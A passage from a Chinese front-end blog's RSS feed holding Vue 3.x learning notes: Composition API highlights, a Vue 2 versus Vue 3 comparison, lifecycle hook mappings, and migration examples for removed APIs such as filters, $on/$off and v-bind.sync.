  <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>hello<span>"</span></span><span>></span></span>我是子组件的checked: {{ checked }}<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span> <span>lang</span><span><span>=</span><span>"</span>ts<span>"</span></span><span>></span></span><span><span>
<span>import</span> <span>{</span> Component<span>,</span> Vue<span>,</span> Model <span>}</span> <span>from</span> <span>"vue-property-decorator"</span><span>;</span>
@Component
<span>export</span> <span>default</span> <span>class</span> <span>HelloWorld</span> <span>extends</span> <span>Vue</span> <span>{</span>
  @<span>Model</span><span>(</span><span>"change"</span><span>,</span> <span>{</span> <span>type</span><span>:</span> Boolean <span>}</span><span>)</span> readonly checked<span>!</span><span>:</span> boolean<span>;</span> <span>//v-model</span>
<span>}</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>vue3.x 学习笔记</title>
      <link>https://vxhly.github.io/views/vuejs/learning-vue3.html</link>
      <guid>https://vxhly.github.io/views/vuejs/learning-vue3.html</guid>
      <source url="https://vxhly.github.io/rss.xml">vue3.x 学习笔记</source>
      <description>前言
vue3.x 已经正式发布了, 由此又有一个大坑需要我们前端工程师来填, 本篇将记录我在学习 vue3.x 时所遇到的坑, 也记录了 vue3.x 的具体更新内容以及与 vue2.x 的对比。

</description>
      <category>vuejs</category>
      <pubDate>Wed, 02 Sep 2020 11:50:11 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>vue3.x 已经正式发布了, 由此又有一个大坑需要我们前端工程师来填, 本篇将记录我在学习 vue3.x 时所遇到的坑, 也记录了 vue3.x 的具体更新内容以及与 vue2.x 的对比。</p>
</div>

<h2 id="看文档很重要" tabindex="-1"> 看文档很重要</h2>
<p>学习 vue 3.x 的第一步当然是上文档：<a href="https://vue3js.cn/docs" target="_blank" rel="noopener noreferrer">vue3 官方文档</a></p>
<div><p>提示</p>
<p>全新版本号 3.2.31</p>
</div>
<h2 id="回顾-option-api" tabindex="-1"> 回顾 Option Api</h2>
<p>众所周知, Vue3.0 带来了一个全新的特性——Composition API。字面意思就是“组合 API”, 它是为了实现基于函数的逻辑复用机制而产生的。</p>
<div><p>提示</p>
<p>在了解 Composition Api 之前, 首先回顾下我们使用 Option Api 遇到的问题, 我们在 Vue2 中常常会需要在特定的区域（data, methods, watch, computed...）编写负责相同功能的代码。</p>
</div>
<p><img src="/assets/learning-vue3-1.gif" alt="learning-vue3"></p>
<h3 id="option-api-的缺陷" tabindex="-1"> Option Api 的缺陷</h3>
<div><p>提示</p>
<p>随着业务复杂度越来越高, 代码量会不断的加大；由于相关业务的代码需要遵循 option 的配置写到特定的区域, 导致后续维护非常的复杂, 代码可复用性也不高。</p>
</div>
<p><img src="/assets/learning-vue3-2.gif" alt="learning-vue3"></p>
<h3 id="composition-api" tabindex="-1"> Composition Api</h3>
<div><p>提示</p>
<p>显然我们可以更加优雅的组织我们的代码, 函数。让相关功能的代码更加有序的组织在一起</p>
</div>
<p><img src="/assets/learning-vue3-3.gif" alt="learning-vue3"> <img src="/assets/learning-vue3-4.gif" alt="learning-vue3"></p>
<h2 id="vue3-x-的真香警告" tabindex="-1"> vue3.x 的真香警告</h2>
<div><p>重点</p>
<p>Higlights:</p>
<ul>
<li>Performance 【高性能】</li>
<li>Tree-shaking support 【更小的体积】</li>
<li>Composition API 【合成 API】</li>
<li>Fragment, Teleport, Suspense 【片段, 传送, 悬念】</li>
<li>Better TypeScript support 【更好的 ts 支持】</li>
<li>Custom Renderer API 【自定义渲染 API】</li>
</ul>
</div>
<div><p>合成 API</p>
<p>Composition API</p>
<ul>
<li>Usable alongside existing Options API 【可与现有选项 API 一起使用】</li>
<li>Flexible logic composition and reuse 【柔性逻辑组合与重用】</li>
<li>Reactivity module can be used as a standalone library 【反应性模块可用作独立库】</li>
</ul>
</div>
<div><p>更好的 ts 支持</p>
<p>Better TypeScript support</p>
<ul>
<li>Codebase written inTS w/ auto-generated type definitions 【CodeBase 编写的 INT w/自动生成的类型定义】</li>
<li>API is the same in JS and TS 【API 在 JS 和 TS 中是相同的】
<ul>
<li>In fact, code will also be largely the same 【实际上, 代码在很大程度上也是相同的】</li>
</ul>
</li>
<li>TSX support 【TSX 支持】</li>
<li>Class component is still supported 【类组件仍然受支持】
<ul>
<li>(vue-class-component@next is currently in alpha) 【(vue-class-Component@next 当前在 alpha 中)】</li>
</ul>
</li>
</ul>
</div>
<div><p>高性能</p>
<p>Performance:</p>
<ul>
<li>Rewritten virtual dom implementation 【重写虚拟域实现】</li>
<li>Compiler-informed fast paths 【编译器通知的快速路径】</li>
<li>More efficient component initialization 【更有效的组件初始化】</li>
<li>1.3~2x better update performance 【1.3~2 倍更好的更新性能】</li>
<li>2~3x faster 【SSR 2~3 倍快 SSR】</li>
</ul>
</div>
<div><p>用于处理大规模用例的新 API</p>
<ul>
<li>reactive</li>
<li>ref</li>
<li>computed</li>
<li>readonly</li>
<li>watchEffect</li>
<li>watch</li>
<li>unref</li>
<li>toRef</li>
<li>toRefs</li>
<li>isRef</li>
<li>isProxy</li>
<li>isReactive</li>
<li>isReadonly</li>
<li>customRef</li>
<li>markRaw</li>
<li>shallowReactive</li>
<li>shallowReadonly</li>
<li>shallowRef</li>
<li>toRaw</li>
</ul>
</div>
<h3 id="vue2-x-vs-vue3-x" tabindex="-1"> Vue2.x VS Vue3.x</h3>
<table>
<thead>
<tr>
<th>Vue 2.x</th>
<th>VS</th>
<th>Vue 3.x</th>
</tr>
</thead>
<tbody>
<tr>
<td>defineproperty</td>
<td>响应式</td>
<td>Proxy</td>
</tr>
<tr>
<td>Options API</td>
<td>开发方式</td>
<td>Composition API</td>
</tr>
<tr>
<td>全部编译</td>
<td>文件体积</td>
<td>按需编译体积更小</td>
</tr>
<tr>
<td>只支持单个根节点</td>
<td>根节点</td>
<td>单个/多个根节点</td>
</tr>
<tr>
<td>JavaScript+Flow</td>
<td>底层源码</td>
<td>TypeScript</td>
</tr>
<tr>
<td>-</td>
<td>update 渲染速度提升</td>
<td>1.3 ~ 1.6x</td>
</tr>
<tr>
<td>-</td>
<td>ssr 渲染速度提升</td>
<td>2x</td>
</tr>
<tr>
<td>IE8+</td>
<td>IE 兼容</td>
<td>预计是 IE11+</td>
</tr>
<tr>
<td>2 种</td>
<td>使用方式</td>
<td>3 种</td>
</tr>
</tbody>
</table>
<h2 id="生命周期对照" tabindex="-1"> 生命周期对照</h2>
<div><p>以下内容参考</p>
<ol>
<li><a href="https://cn.vuejs.org/v2/api/#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90" target="_blank" rel="noopener noreferrer">Vue2.x 选项/生命周期钩子</a></li>
<li><a href="https://vue-composition-api-rfc.netlify.app/zh/api.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0" target="_blank" rel="noopener noreferrer">Vue3.x 生命周期钩子函数</a></li>
</ol>
</div>
<h3 id="vue2-x-生命周期" tabindex="-1"> Vue2.x 生命周期</h3>
<ul>
<li><code>beforeCreate</code> , 在实例初始化之后, 数据观测 (data observer) 和 event/watcher 事件配置之前被调用。</li>
<li><code>created</code> , 在实例创建完成后被立即调用。在这一步, 实例已完成以下的配置：数据观测 (data observer), 属性和方法的运算, watch/event 事件回调。然而, 挂载阶段还没开始, $el 属性目前尚不可用。</li>
<li><code>beforeMount</code> , 在挂载开始之前被调用：相关的 render 函数首次被调用。</li>
<li><code>mounted</code> , 实例被挂载后调用, 这时 <code>el</code> 被新创建的 <code>vm.$el</code> 替换了。 如果根实例挂载到了一个文档内的元素上, 当 mounted 被调用时 <code>vm.$el</code> 也在文档内。</li>
<li><code>beforeUpdate</code> , 数据更新时调用, 发生在虚拟 DOM 打补丁之前。这里适合在更新之前访问现有的 DOM, 比如手动移除已添加的事件监听器。</li>
<li><code>updated</code> , 由于数据更改导致的虚拟 DOM 重新渲染和打补丁, 在这之后会调用该钩子。</li>
<li><code>activated</code> , 被 keep-alive 缓存的组件激活时调用。</li>
<li><code>deactivated</code> , 被 keep-alive 缓存的组件停用时调用。</li>
<li><code>beforeDestroy</code> , 实例销毁之前调用。在这一步, 实例仍然完全可用。</li>
<li><code>destroyed</code> , 实例销毁后调用。该钩子被调用后, 对应 Vue 实例的所有指令都被解绑, 所有的事件监听器被移除, 所有的子实例也都被销毁。</li>
<li><code>errorCaptured</code> , 当捕获一个来自子孙组件的错误时被调用。</li>
</ul>
<h4 id="生命周期函数执行顺序" tabindex="-1"> 生命周期函数执行顺序</h4>
<p><code>beforeCreate</code> =&gt; <code>created</code> =&gt; <code>beforeMount</code> =&gt; <code>mounted</code> =&gt; <code>beforeUpdate</code> =&gt; <code>updated</code> =&gt; <code>beforeDestroy</code> =&gt; <code>destroyed</code></p>
<h3 id="vue3-x-生命周期" tabindex="-1"> Vue3.x 生命周期</h3>
<p>被替换的</p>
<ul>
<li>beforeCreate -&gt; setup()</li>
<li>created -&gt; setup()</li>
</ul>
<p>重命名</p>
<ul>
<li>beforeMount -&gt; onBeforeMount</li>
<li>mounted -&gt; onMounted</li>
<li>beforeUpdate -&gt; onBeforeUpdate</li>
<li>updated -&gt; onUpdated</li>
<li>beforeDestroy -&gt; onBeforeUnmount</li>
<li>destroyed -&gt; onUnmounted</li>
<li>errorCaptured -&gt; onErrorCaptured</li>
</ul>
<p>新增</p>
<ul>
<li>onRenderTracked</li>
<li>onRenderTriggered</li>
</ul>
<p>Vue3.x 中建议使用 <code>setup()</code> 代替 <code>beforeCreate</code> 、 <code>created</code> 钩子函数, 虽然 Vue3.x 兼容 Vue2.x 的大部分语法, 但是在 Vue3.x 中慎用以下钩子函数, 以下的生命周期钩子函数被改名后, 在 Vue3.x 中将不会再有 <code>beforeDestroy</code> 和 <code>destroyed</code></p>
<ul>
<li>beforeDestroy -&gt; onBeforeUnmount</li>
<li>destroyed -&gt; onUnmounted</li>
</ul>
<h4 id="生命周期函数执行顺序-1" tabindex="-1"> 生命周期函数执行顺序</h4>
<p><code>setup</code> =&gt; <code>onBeforeMount</code> =&gt; <code>onRenderTracked</code> =&gt; <code>onMounted</code> =&gt; <code>onRenderTriggered</code> =&gt; <code>onBeforeUpdate</code> =&gt; <code>onRenderTracked</code> =&gt; <code>OnUpdated</code> =&gt; <code>onBeforeUnmount</code> =&gt; <code>onUnmounted</code></p>
<h2 id="vue3-x-弃用的语法或者-api" tabindex="-1"> vue3.x 弃用的语法或者 API</h2>
<div><p>提示</p>
<ul>
<li>下方内容可在官方文档中找到对照：<a href="https://vue3js.cn/docs/guide/migration/introduction.html#overview" target="_blank" rel="noopener noreferrer">迁移至 Vue 3</a></li>
<li>当然也可以在这里找到对照：<a href="https://juejin.im/post/6844904165378883591" target="_blank" rel="noopener noreferrer">vue 3.x 如何有惊无险地快速入门</a></li>
<li>更多的变更提案参考：<a href="https://github.com/vuejs/rfcs/tree/master/active-rfcs" target="_blank" rel="noopener noreferrer">Vue RFC</a></li>
</ul>
</div>
<h3 id="全局配置" tabindex="-1"> 全局配置</h3>
<div><p>删除了</p>
<p><code>Vue.config.silent</code> 、 <code>Vue.config.productionTip</code> 、 <code>Vue.config.keyCodes</code></p>
</div>
<p>这里需要注意的是 <code>Vue.config.ignoredElements</code> 被修改成 <code>app.config.isCustomElement</code> vue2.x 中的写法</p>
<div><pre><code>Vue<span>.</span>config<span>.</span>ignoredElements <span>=</span> <span>[</span><span>"my-el"</span><span>,</span> <span><span>/</span><span>^ion-</span><span>/</span></span><span>]</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>vue3.x 中的写法</p>
<div><pre><code><span>const</span> app <span>=</span> Vue<span>.</span><span>createApp</span><span>(</span><span>)</span><span>;</span>
app<span>.</span>config<span>.</span><span>isCustomElement</span> <span>=</span> <span>(</span><span>tag</span><span>)</span> <span>=></span> tag<span>.</span><span>startsWith</span><span>(</span><span>"ion-"</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><p>vue3.x 中不再支持 prototype 的方式给 Vue 绑定静态方法, 可以参考以下的方法进行改进与修正</p>
<div><pre><code><span>// Before</span>
<span>Vue</span><span>.</span>prototype<span>.</span><span>$http</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>;</span>
<span>// After</span>
<span>const</span> app <span>=</span> Vue<span>.</span><span>createApp</span><span>(</span><span>{</span><span>}</span><span>)</span><span>;</span>
app<span>.</span>config<span>.</span>globalProperties<span>.</span><span>$http</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span><span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="全局-api" tabindex="-1"> 全局 API</h3>
<div><p>删除了</p>
<p><code>Vue.extend</code> 、 <code>Vue.set</code> 、 <code>Vue.delete</code></p>
</div>
<p>这里需要注意的是 <code>Vue.set</code> 、 <code>Vue.delete</code> 这两个 API 在正式版的 vue3.x 中是已经删除了, 但是在 vue3.x 的兼容版本中还是被保留了</p>
<p>对比 2.x API</p>
<ul>
<li><code>Vue.nextTick</code></li>
<li><code>Vue.observable</code></li>
<li><code>Vue.version</code></li>
<li><code>Vue.compile</code> (only in full builds)</li>
<li><code>Vue.set</code> (only in compat builds)</li>
<li><code>Vue.delete</code> (only in compat builds)</li>
</ul>
<h3 id="选项-数据" tabindex="-1"> 选项 / 数据</h3>
<div><p>删除了</p>
<p><code>data-object</code> 的写法</p>
</div>
<p>在 vue3.x 中所有的东西都以函数式声明方式, 当然包含 data 的声明方式也弃用了对象式声明方式</p>
<p>vue2.x 中的写法</p>
<div><pre><code><span>var</span> data <span>=</span> <span>{</span>
  <span>a</span><span>:</span> <span>1</span><span>,</span>
<span>}</span><span>;</span>

<span>// 直接创建一个实例</span>
<span>var</span> vm <span>=</span> <span>new</span> <span>Vue</span><span>(</span><span>{</span>
  <span>data</span><span>:</span> data<span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>vue3.x 中的写法</p>
<div><pre><code><span>import</span> <span>{</span> createApp <span>}</span> <span>from</span> <span>"vue"</span><span>;</span>

<span>createApp</span><span>(</span><span>)</span><span>.</span><span>mount</span><span>(</span>
  <span>{</span>
    <span>data</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>{</span>
        <span>a</span><span>:</span> <span>1</span><span>,</span>
      <span>}</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>"#app"</span>
<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="选项-资源" tabindex="-1"> 选项 / 资源</h3>
<div><p>删除了</p>
<p><code>filters</code></p>
</div>
<p>vue2.x 中的写法</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>{{ hello | toUpperCase }}<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>hello</span><span>:</span> <span>"hello word"</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>filters</span><span>:</span> <span>{</span>
    <span>toUpperCase</span><span>(</span><span>val</span><span>)</span> <span>{</span>
      <span>return</span> val<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>vue3.x 中已经将 <code>filters</code> 这一个 API 进行删除了, 所以在 vue3.x 中更加推荐使用 method 或者 computed</p>
<div><pre><code><span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span><span>></span></span>{{ helloUp }}<span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>hello</span><span>:</span> <span>"hello word"</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
  <span>computed</span><span>:</span> <span>{</span>
    <span>helloUp</span><span>(</span><span>)</span> <span>{</span>
      <span>return</span> <span>this</span><span>.</span>hello<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="实例方法-事件" tabindex="-1"> 实例方法 / 事件</h3>
<div><p>删除了</p>
<p><code>$on</code> 、 <code>$once</code> 、 <code>$off</code></p>
</div>
<p>vue2.x 中的写法</p>
<div><pre><code><span>// eventHub.js</span>

<span>const</span> eventHub <span>=</span> <span>new</span> <span>Vue</span><span>(</span><span>)</span><span>;</span>

<span>export</span> <span>default</span> eventHub<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>// ChildComponent.vue</span>
<span>import</span> eventHub <span>from</span> <span>"./eventHub"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>mounted</span><span>(</span><span>)</span> <span>{</span>
    <span>// adding eventHub listener</span>
    eventHub<span>.</span><span>$on</span><span>(</span><span>"custom-event"</span><span>,</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span><span>"Custom event triggered!"</span><span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
  <span>beforeDestroy</span><span>(</span><span>)</span> <span>{</span>
    <span>// removing eventHub listener</span>
    eventHub<span>.</span><span>$off</span><span>(</span><span>"custom-event"</span><span>)</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>vue3.x 中已经将 <code>$on</code> 、 <code>$off</code> 、 <code>$once</code> 方法进行完全删除。在 vue3.x 中更加推荐使用 <code>$emit</code> 或者使用 vuex。</p>
<p>在 vue3.x 里也可以这样写</p>
<div><pre><code><span>&lt;!-- 子组件 --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>button</span> <span>@click</span><span><span>=</span><span>"</span>handleClick<span>"</span></span><span>></span></span>按钮<span><span><span>&lt;/</span>button</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"Hello"</span><span>,</span>
  <span>emits</span><span>:</span> <span>[</span><span>"childClick"</span><span>]</span><span>,</span>
  <span>setup</span><span>(</span><span>props<span>,</span> <span>{</span> emit <span>}</span></span><span>)</span> <span>{</span>
    <span>const</span> <span>handleClick</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>emit</span><span>(</span><span>"childClick"</span><span>,</span> <span>"hello"</span><span>)</span><span>;</span>
    <span>}</span><span>;</span>
    <span>return</span> <span>{</span>
      props<span>,</span>
      handleClick<span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>&lt;!-- 父组件 --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>Hello</span> <span>@childClick</span><span><span>=</span><span>"</span>parentClick<span>"</span></span> <span>/></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>import</span> Hello <span>from</span> <span>"./Hello.vue"</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"App"</span><span>,</span>
  <span>components</span><span>:</span> <span>{</span>
    Hello<span>,</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>parentClick</span><span>(</span><span>e</span><span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>e<span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>也可采用第三方库 <a href="https://github.com/developit/mitt" target="_blank" rel="noopener noreferrer">mitt</a> 来实现组件通信</p>
<div><pre><code><span>import</span> mitt <span>from</span> <span>"mitt"</span><span>;</span>
<span>const</span> emitter <span>=</span> <span>mitt</span><span>(</span><span>)</span><span>;</span>
<span>// listen to an event</span>
emitter<span>.</span><span>on</span><span>(</span><span>"foo"</span><span>,</span> <span>(</span><span>e</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span><span>"foo"</span><span>,</span> e<span>)</span><span>)</span><span>;</span>
<span>// fire an event</span>
emitter<span>.</span><span>emit</span><span>(</span><span>"foo"</span><span>,</span> <span>{</span>
  <span>a</span><span>:</span> <span>"b"</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="实例-property" tabindex="-1"> 实例 property</h3>
<div><p>删除了</p>
<p><code>$scopedSlots</code></p>
</div>
<p>vue3.x 中统一了常规插槽和作用域插槽, <code>this.$slots</code> 将插槽公开为功能, <code>this.$scopedSlots</code> 已经被删除了, 在 vue3.x 中只需将 <code>this.$scopedSlots</code> 替换成 <code>this.$slots</code> 即可</p>
<div><p>删除了</p>
<p><code>$listeners</code></p>
</div>
<p>vue3.x 中 <code>$attrs</code> 的包含父范围属性绑定和未识别（提取）为组件 prop 或自定义事件的事件。需要将 <code>$listeners</code> 改成 <code>$attrs</code></p>
<div><p>删除了</p>
<p><code>$children</code> 、 <code>$isServer</code></p>
</div>
<h3 id="指令" tabindex="-1"> 指令</h3>
<div><p>删除了</p>
<p><code>v-bind.sync</code></p>
</div>
<p>vue2.x 中的写法</p>
<div><pre><code><span>&lt;!-- 子组件 --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>div</span> <span>v-show</span><span><span>=</span><span>"</span>visible<span>"</span></span> <span>@click</span><span><span>=</span><span>"</span>$_handlerCLick<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>

<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>name</span><span>:</span> <span>"custom-model"</span><span>,</span>
  <span>props</span><span>:</span> <span>{</span>
    <span>visible</span><span>:</span> <span>{</span>
      <span>type</span><span>:</span> Boolean<span>,</span>
      <span>default</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
  <span>methods</span><span>:</span> <span>{</span>
    <span>$_handlerCLick</span><span>(</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>$emit</span><span>(</span><span>"update:visible"</span><span>,</span> <span>false</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>&lt;!-- 父组件 --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>custom-model</span> <span>:visible.sync</span><span><span>=</span><span>"</span>show<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>custom-model</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>show</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>vue 3.x 中只需将 v-bind.sync 的语法替换成 v-model 即可</p>
<div><pre><code><span>&lt;!-- 父组件 --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>custom-model</span> <span><span>v-model:</span>visible</span><span><span>=</span><span>"</span>show<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>custom-model</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
<span><span><span>&lt;</span>script</span><span>></span></span><span><span>
<span>export</span> <span>default</span> <span>{</span>
  <span>data</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>{</span>
      <span>show</span><span>:</span> <span>false</span><span>,</span>
    <span>}</span><span>;</span>
  <span>}</span><span>,</span>
<span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>删除了</p>
<p><code>v-on.keyup</code> 中的的 <code>keyCodes</code> 形式作为的修饰符</p>
</div>
<p>vue2.x 中的写法</p>
<div><pre><code><span>&lt;!-- keyCode version --></span>
<span><span><span>&lt;</span>input</span> <span><span>v-on:</span>keyup.13</span><span><span>=</span><span>"</span>submit<span>"</span></span> <span>/></span></span>

<span>&lt;!-- alias version --></span>
<span><span><span>&lt;</span>input</span> <span><span>v-on:</span>keyup.enter</span><span><span>=</span><span>"</span>submit<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>vue3.x 中写法（由于 <a href="https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/keyCode" target="_blank" rel="noopener noreferrer"> <code>KeyboardEvent.keyCode</code> 已弃用</a>, 因此 Vue 3 也不再继续支持此功能。因此, 现在建议将 kebab-case 名称用于要用作修饰符的任何键。）</p>
<div><pre><code><span>&lt;!-- Vue 3 Key Modifier on v-on --></span>
<span><span><span>&lt;</span>input</span> <span><span>v-on:</span>keyup.delete</span><span><span>=</span><span>"</span>confirmDelete<span>"</span></span> <span>/></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div></div></div><h3 id="内置组件" tabindex="-1"> 内置组件</h3>
<div><p>内置组件</p>
<p>当 <code>&lt;transition&gt;</code> 作为组件的根元素时, 外部切换不会触发过渡效果, 也就是说我们只能在 <code>&lt;transition&gt;</code> 内使用切换。</p>
</div>
<p>vue2.x 中的写法</p>
<div><pre><code><span>&lt;!-- modal component --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>transition</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>modal<span>"</span></span><span>></span></span><span><span><span>&lt;</span>slot</span> <span>/></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
  <span><span><span>&lt;/</span>transition</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span>&lt;!-- usage --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>modal</span> <span>v-if</span><span><span>=</span><span>"</span>showModal<span>"</span></span><span>></span></span>hello<span><span><span>&lt;/</span>modal</span><span>></span></span>
<span><span><span>&lt;/</span>template</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>vue3.x 中的写法</p>
<div><pre><code><span>&lt;!-- modal component --></span>
<span><span><span>&lt;</span>template</span><span>></span></span>
  <span><span><span>&lt;</span>transition</span><span>></span></span>
